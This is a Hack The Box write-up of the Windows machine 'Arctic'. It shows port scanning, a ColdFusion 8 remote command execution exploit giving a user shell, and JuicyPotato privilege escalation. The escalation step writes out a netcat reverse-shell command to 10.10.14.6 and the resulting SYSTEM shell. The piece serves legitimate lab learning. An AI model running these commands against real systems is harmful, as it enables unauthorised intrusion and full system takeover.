---
title: "Arctic"
date: 2023-08-10T11:30:03+00:00
tags: ["web","windows", "Adobe ColdFusion 8",”JuicyPotato”]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Arctic.png"
comments: false
description: "This is a friendly windows machine which has a vulnerability due to the low version of Adobe Cold Fusion, which allowed remote command execution." 
---

## Room Information

- Room name: Arctic
- Difficulty level: Easy
- Room link: [https://app.hackthebox.com/machines/Arctic](https://app.hackthebox.com/machines/Arctic)

![/HTB/Arctic.png](/HTB/Arctic.png)

## Tools Used

- Nmap
- searchsploit
- gobuster
- smbserver.py
- msfvenom
- juicypotato

## Port Scanning

Other room, other port scan.

```ruby
# Nmap 7.94 scan initiated Wed Aug 30 10:38:36 2023 as: nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn -oN escaneo 10.10.10.11
Nmap scan report for 10.10.10.11
Host is up, received user-set (0.26s latency).
Scanned at 2023-08-30 10:38:39 EDT for 172s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON          VERSION
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
8500/tcp  open  fmtp?   syn-ack ttl 127
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 30 10:41:31 2023 -- 1 IP address (1 host up) scanned in 175.49 seconds
```

I found 3 open ports, 135(msrpc), 8500(fmtp), 49154(msrpc). So let's focus on the website…

## Enumeration

On this machine I didn’t do any scan with **gobuster** or **wfuzz**…

![Untitled](/HTB/web-arctic.png)

I started to see if this contained anything interesting, but between the page going super slow and not finding anything, I left it and tried something else.

The next thing I did was to search with `searchsploit` for Adobe Cold Fusion, and I found some exploits. I use this:

 

```ruby
┌──(kali㉿kali)-[~/HTB/arctic]
└─$ searchsploit Adobe Cold Fusion                                                               
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                             | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE) | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code  | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                      | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                  | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                 | cfm/webapps/36172.txt
-> Adobe ColdFusion 8 - Remote Command Execution (RCE)                                | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                          | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)             | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                    | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)          | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Quer | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String  | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' C | cfm/webapps/33168.txt
----------------------------------------------------------------------------------- ---------------------------------
```

## Exploiting

… and with just this and changing some things in the exploit I got an interactive console.

```ruby
┌──(kali㉿kali)-[~/HTB/arctic]
└─$ python 50057.py

Generating a payload...
Payload size: 1495 bytes
Saved as: fbac3fcf841e499cbedd5ec726b26aeb.jsp
...

...
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
**-> arctic\tolis**
```

## Escalation of privileges

The first thing I always do in windows is to see what user we are and if we can access any input flag. In this case I could access to **tolis** flag. The next thing I did was to see the permissions I had.

```ruby
C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
**-> SeImpersonatePrivilege        Impersonate a client after authentication Enabled** 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

When I saw that the `SeImpersonatePrivilege` permission was enabled, the vulnerability called `JuicyPotato` came to my mind. 

So I will look for this vulnerability but according to the version of the victim machine because otherwise it would have no effect and we would waste our time. So I made a `systemminfo` to know the windows version. I got the following:

```ruby
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          1/9/2023, 1:34:34 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.124 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.304 MB
Virtual Memory: In Use:    981 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

Now that I knew I was dealing with a `Microsoft Windows Server 2008 R2 Standard` all that was left was to look it up on the internet and download the exploit. 

The website → https://github.com/ohpe/juicy-potato/releases

I then passed this file (JuicyPotato.exe) and nc64.exe through the smbserver to the victim machine and ran the following command to get a reverse shell on port 443 which was listening:

```ruby
C:\Windows\Temp\privesc>**JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.14.6 443"
JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.14.6 443"**
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

//THEN

┌──(kali㉿kali)-[~/HTB/arctic]
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.11] 49803
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
**nt authority\system**
```

![Untitled](/HTB/root-arctic.png)

Then I was root 😎

## Lessons Learned

- What insights did you gain from the room?
    
    I learned more about Adobe Cold Fusion, and JuicyPotato.
    
- Were there any novel tools or techniques employed?
    
    Exploting an Adobe Cold Fusion vuln.
